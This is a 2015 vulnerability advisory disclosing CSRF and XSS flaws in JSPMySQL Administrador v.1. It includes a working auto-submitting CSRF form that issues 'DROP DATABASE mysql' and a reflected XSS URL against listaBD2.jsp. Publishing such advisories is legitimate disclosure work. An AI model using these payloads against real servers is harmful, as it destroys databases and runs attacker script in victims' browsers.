@@ -1,0 +1,142 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/AS-JSPMYSQLADMINISTRADOR-0904.txt
+
+
+
+Vendor:
+================================
+JSPMySQL Administrador
+https://sites.google.com/site/mfpledon/producao-de-software
+
+
+
+Product:
+================================
+JSPMySQL Administrador v.1 is a remote administration of MySQL databases
+that are on a Web server using JSP technology
+
+
+Vulnerability Type:
+===================
+CSRF & XSS
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+
+Vulnerability Details:
+=====================
+
+1) No CSRF token exists allowing remote attackers to run arbitrary SQL
+commands
+on the MySQL database.
+
+2) XSS entry point exists on the listaBD2.jsp web page opening up the
+application
+for client side browser code execution.
+
+In either case get victim to visit our malicious webpage or click on our
+malicious linx then KABOOOOOOOOOOOOOOOOOOOOOOM!!!
+
+
+
+
+Exploit code(s):
+===============
+
+1- CSRF to drop the default MySQL database on the remote server:
+----------------------------------------------------------------
+
+<!DOCTYPE>
+<html>
+<head>
+<title>JSP-MYSQL-ADMIN-CSRF</title>
+
+<body onLoad="doit()">
+
+<script>
+function doit(){
+var e=document.getElementById('HELL')
+e.submit()
+}
+
+<!-- CSRF DROP MYSQL DATABASE -->
+
+<form id="HELL" action="http://localhost:8081/sys/sys/listaBD2.jsp"
+method="post">
+<input type="text" name="cmd" value="DROP DATABASE mysql"/>
+<input type="text" name="btncmd" value="Enviar" />
+<input type="text" name="bd" value="mysql" />
+</form>
+
+
+
+2- XSS client side code execution delivered to the victim:
+----------------------------------------------------------
+
+http://localhost:8081/sys/sys/listaBD2.jsp?bd=%22/%3E%3Cscript%3Ealert%28666%29%3C/script%3E
+
+
+
+
+
+Disclosure Timeline:
+=========================================================
+
+
+Vendor Notification:  August 31, 2015
+September 4, 2015  : Public Disclosure
+
+
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+
+Severity Level:
+=========================================================
+High
+
+
+
+Description:
+==========================================================
+
+
+Request Method(s):              [+] POST & GET
+
+
+Vulnerable Product:             [+] JSPMySQL Administrador v.1
+
+
+Vulnerable Parameter(s):        [+] cmd, bd
+
+
+Affected Area(s):               [+] listaBD2.jsp
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
